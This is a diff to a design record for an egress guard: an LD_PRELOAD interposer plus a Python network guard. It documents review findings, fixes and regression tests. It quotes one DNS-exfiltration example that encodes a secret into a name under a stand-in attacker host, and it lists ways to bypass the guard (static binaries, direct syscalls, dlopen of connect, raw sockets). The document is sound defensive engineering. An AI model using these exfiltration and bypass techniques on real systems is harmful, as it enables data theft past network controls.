@@ -6,8 +6,13 @@ settings this deployment dials, installed by patching nine names — `socket.soc
 pure Python and has been tested as such since it shipped.
 
 **None of this deployment's two highest-value destinations goes through any of those nine names.**
-Measured at `629b675` with the allowlist deliberately empty, no proxy variables set, and a listener
-on a non-loopback address:
+Measured on the tree as it stood before this change — `core/netguard.py` armed and no interposer,
+which is exactly what `tests/test_netguard_preload.py`'s arm A reproduces on any checkout — with the
+allowlist deliberately empty, no proxy variables set, and a listener on a non-loopback address. (The
+state is named by what it *is* rather than by a branch SHA on purpose: this lands through PR #350 as
+a squash, and a hash cited from the branch is unreachable from `main` the moment it merges.
+`tests/test_decision_log.py::test_no_adr_cites_a_commit_a_squash_will_strand` is what stops the next
+one.)
 
 ```
 [control] raw socket.create_connection -> refused EgressForbidden   _refused 0 -> 1
@@ -39,7 +44,7 @@ a network dependency at build time — to keep out something the runtime image s
 interposer compiles in that image with `-Werror` clean, and driven there refuses `8.8.8.8:443` with
 `Operation not permitted` while a loopback dial reaches the stack (`ECONNREFUSED`).
 
-**Measured on the implementation, not on the prototype.** Three arms against a *real* gRPC server
+**Measured on the implementation, not on the prototype.** Four arms against a *real* gRPC server
 (`grpc.server` in the test process, bound to `0.0.0.0` so one port answers on both routes), each
 client in a clean subprocess with proxy variables stripped — without that scrub, arm B dials a
 loopback proxy, which the interposer permits, and the arm passes for the wrong reason:
@@ -146,19 +151,115 @@ remote, which is not on the settings object the allowlist is derived from.
   a process imports can arm it for itself. A re-exec from inside `chemclaw.core.config` was
   considered and rejected — it would lose `-m` semantics and break pytest, for a launcher-shaped
   problem.
+- **No local lane carries it.** The `.so` is built in one place, `deploy/Containerfile`, so
+  `make chat`, `make connectors`, `make live-up`, the four-repo `e2e-full-stack` lane and every
+  local or CI `pytest` run with the compiled layer absent — a green live lane is evidence about the
+  Python layer and about nothing else. The gauge says so rather than implying it
+  (`chemclaw_egress_preload_armed` reads 0 there, asked of the dynamic linker), and
+  `tests/test_netguard_preload.py` builds the library with the image's own recipe so the *behaviour*
+  is still measured on every run. This is stated because the paragraph above conceded the class
+  generically and named no lane; `infra/README.md` now carries the same sentence where a developer
+  reads it.
 - **Failing closed means the pod crashloops.** Under `set -e` a failed posture query stops the
   container rather than starting it unguarded, which is the direction that matters: an unguarded
   process is indistinguishable from a guarded one until something exfiltrates.
 
-**What neither layer covers, stated rather than implied.** A **statically linked** binary or one
-issuing the syscall directly — there is no dynamic symbol to interpose and no Python object to patch.
-Anything not named: `sendmmsg`, `io_uring`, a raw `AF_PACKET` socket, a `write` on a descriptor this
+**What neither layer covers, stated rather than implied.** A **statically linked** binary, one
+issuing the syscall directly, or one that `dlopen`s libc and `dlsym`s `connect` out of it — there is
+no dynamic symbol to interpose and no Python object to patch. The **raw resolver API**
+(`res_query`, `res_search`, the `res_n*` kin): they build the DNS packet themselves and send it on a
+socket the resolver has connected to a nameserver, which is the one address the DNS exemption
+permits, and interposing them would mean decoding a wire-format QNAME out of a caller-owned buffer
+to recover the string the caller already held — for an API library code almost never reaches for.
+Anything not named: `io_uring`, a raw `AF_PACKET` socket, a `write` on a descriptor this
 guard already allowed. A process the library is not loaded into. And **where** traffic goes once a
 proxy is in the environment, because a proxied dial is a legitimate connection to the proxy —
 `refuse_proxied_egress` is the layer for that shape, and a loopback sidecar shares the pod's network
 namespace, so there is none under it. Those are the NetworkPolicy's and that boot check's,
 and `deploy/helm/chemclaw/values.yaml` now says so where a deployer sizes
 `networkPolicy.egressDestinations`, which said nothing about either.
+
+**Pre-merge review found the DNS exemption open at four entry points, and the header denying it.**
+The exemption above lets any datagram to a `/etc/resolv.conf` nameserver on port 53 through, and the
+C header justified that with "a name that is not on the allowlist never gets that far, because
+`getaddrinfo` refuses it first" — true of `getaddrinfo` and of nothing else. Measured on one binary,
+allowlist `127.0.0.1,localhost`:
+
+```
+                        CONTROL (no library)      ARMED (as first written)
+getaddrinfo(example.com)  -> 172.66.147.243        -2 EAI_NONAME   [refused, logged]
+gethostbyname             -> 104.20.23.154         104.20.23.154   *** RESOLVED ***
+gethostbyname2            -> 104.20.23.154         104.20.23.154   *** RESOLVED ***
+gethostbyname_r           -> 172.66.147.243        172.66.147.243  *** RESOLVED ***
+gethostbyname2_r          -> 104.20.23.154         172.66.147.243  *** RESOLVED ***
+res_query                 -> 61 bytes              61 bytes        *** RESOLVED ***
+```
+
+So `gethostbyname("<base32-of-a-secret>.attacker.example")` reached an attacker-controlled
+authoritative nameserver with the interposer armed, `chemclaw_egress_preload_refused_resolve` flat
+and nothing on stderr — a pod an operator reads as clean. It was also a disagreement with
+`netguard.py` **in the wrong direction**: the Python layer patches `socket.gethostbyname` precisely
+because that entry point matters, and the compiled layer, which exists to cover what Python cannot
+see, covered less. The two `_r` rows are ones the review's own report did not list and driving the
+probe found.
+
+The whole family is interposed now, through one `check_name` the five resolver entry points share
+(a second hand-written copy is the defect one generation later), and **the refusal is
+byte-identical to a real NXDOMAIN because that is what glibc was measured doing** rather than what
+the manual page suggests: `gethostbyname` → NULL with `h_errno = HOST_NOT_FOUND`; the `_r` forms →
+return **0**, `*result` NULL, `*h_errnop = HOST_NOT_FOUND`. A nonzero return is reserved for
+`ERANGE`, so returning `HOST_NOT_FOUND` as the status — which guessing the contract would have
+produced — is a buffer-size error to every caller that reads it correctly. Re-driven after the fix:
+all four refused and logged, `resolve=4 connect=0`, and all four resolve again with the name on the
+allowlist. `res_query`/`res_search` are **named in the uncovered list** instead of chased.
+
+**`sendmmsg` moved the other way: it was conceded and it was measured connecting.** Two messages to
+a real non-loopback route went out with the interposer armed; six lines of `check_address` over each
+`msgvec[i].msg_hdr.msg_name` closed it, one refused address refusing the whole batch because a
+partial send would report success for a batch this layer did not permit. A `dlopen("libc.so.6")` +
+`dlsym("connect")` was measured connecting too and is **not** closed — it is added to the stated
+list, beside `syscall(SYS_connect, …)`, because both need native code already running in this
+process, which is the tier where the NetworkPolicy is the control.
+
+**Three shipped chart workloads never reached the entrypoint, so none of them carried the layer.**
+`schedules-job.yaml` and both halves of `migrate-job.yaml` declared a Kubernetes `command:`, which
+**replaces** the image `ENTRYPOINT` rather than prefixing it — and arming happens only inside
+`deploy/entrypoint.sh`. The Schedules Job is the sharp one: it runs on **every `helm upgrade`** and
+its entire outbound traffic is gRPC to Temporal through the Rust sdk-core, which is the exact class
+this whole ADR exists for. `test_no_shipped_deployment_starts_without_arming_the_compiled_layer` was
+green throughout, because it asserted two true-but-insufficient things — that arming precedes
+dispatch *inside* the script, and that no chart file *sets* `LD_PRELOAD`. Nor could the metrics have
+caught it: a hook Job declares no port, so `chemclaw_egress_preload_armed` is never scraped from
+one, and the entrypoint is the only control those workloads have.
+
+All three are components now (`schedules`, `migrate`, `convert`) with their command in the script
+and `CHEMCLAW_COMPONENT` in the chart — which also moves the migrate/grants ordering argument into
+the image, where `set -e` means exactly what the `&&` meant, and gives each Job a row in
+`_COMPONENT_MAKES_MODEL_CALLS`. The new guard is
+`test_every_container_running_this_image_reaches_the_entrypoint_that_arms_it`, which **derives** the
+set from the templates: every container referencing `chemclaw.image` whose `command:` first element
+is not the entrypoint must be on a named, argued exemption list. The three knowledge-sync containers
+are on it, with the reason `entrypoint.sh` already gave — they dial a git remote, which no setting
+derives.
+
+**The alert could not fire for the condition its own description names.** `max(...) < 1` over a
+per-pod gauge is 1 as soon as **any one** pod is armed, so a fleet with one disarmed pod never
+alerts — and one process kind out of four being unguarded while three are fine is exactly what this
+wave is about. Driven with `promtool test rules` over a two-pod series (one armed, one disarmed):
+the shipped `max` shape produced **no alert**, `min(...) < 1` produced one. Both
+`ChemclawEgressPreloadDisarmed` and the pre-existing `ChemclawEgressGuardDisarmed` it copied are
+fixed, and `tests/test_deploy_chart.py::test_a_single_disarmed_pod_is_what_these_alerts_are_for`
+rebuilds the two rules **from the render** and evaluates them, because `promtool check rules` — what
+`make helm-validate` runs — parses an expression and says nothing about what it evaluates to.
+
+**And the runbook gave dead advice.** Its `ChemclawEgressPreloadRefused` section named two
+destinations "not derived from any setting", one of them a collector in
+`OTEL_EXPORTER_OTLP_ENDPOINT` — which the same diff taught `derive_allowed` to read. Measured:
+with only the standard variable set, `derive_allowed` returns `['127.0.0.1', 'collector.example',
+'localhost']` at `otel_enabled=true` and drops it at `false`, which is the only posture in which
+anything dials a collector at all. The git-remote half is real and stays. The same section split the
+counters three ways against a code that splits them two — every dial verb books on
+`…_refused_connect`, only `resolve` on `…_refused_resolve` — and that is corrected too.
 
 **Two corrections in `derive_allowed` that enforcement turned from cosmetic into real.**
 
@@ -228,9 +329,23 @@ each was watched failing against a named mutation of the thing it guards:
   recurs: the stub failed *every* invocation, so the assertion passed on the stub's own exit code and
   the mutation survived. The stub now fails the posture query and succeeds at everything else, and
   the test asserts the component did not run.
-- `test_the_interposer_states_what_it_cannot_cover` — the three uncoverable classes are properties of
+- `test_the_interposer_states_what_it_cannot_cover` — the uncoverable classes are properties of
   dynamic linking and cannot be asserted by running anything; what can be asserted is that the file a
-  reader opens concedes them.
+  reader opens concedes them, and that it does **not** concede `sendmmsg`, which is interposed — a
+  stale concession reads as a gap and invites somebody to close it twice. Red with `res_query`
+  removed from the header, and red with `sendmmsg` put back on the list.
+- `test_the_whole_resolver_family_is_refused_and_not_only_getaddrinfo` — red with the check removed
+  from `gethostbyname`, red with `gethostbyname_r` answering `HOST_NOT_FOUND` as its *status*, and
+  red with resolve refusals booked on the dial counter. Driven through `ctypes.CDLL(None)`, because
+  CPython's `socket.gethostbyname` resolves through `getaddrinfo` and cannot reach this family at
+  all — part of why the gap survived. Both arms use the host's own name, so neither needs a query to
+  leave the host.
+- `test_a_batched_datagram_to_an_undeclared_host_is_refused` — red with the `sendmmsg` check removed.
+- `test_every_container_running_this_image_reaches_the_entrypoint_that_arms_it` — red with either
+  Job's `command:` restored (both spellings, the inline list and the block list), and red when the
+  exemption list names a container the chart no longer has.
+- `tests/test_deploy_chart.py::test_a_single_disarmed_pod_is_what_these_alerts_are_for` — red with
+  either alert back on `max`.
 - `tests/test_deploy_chart.py::test_the_destination_list_says_which_layer_it_is_the_only_one_of` —
   red when any of the four claims is dropped from the `egressDestinations` comment block.
 
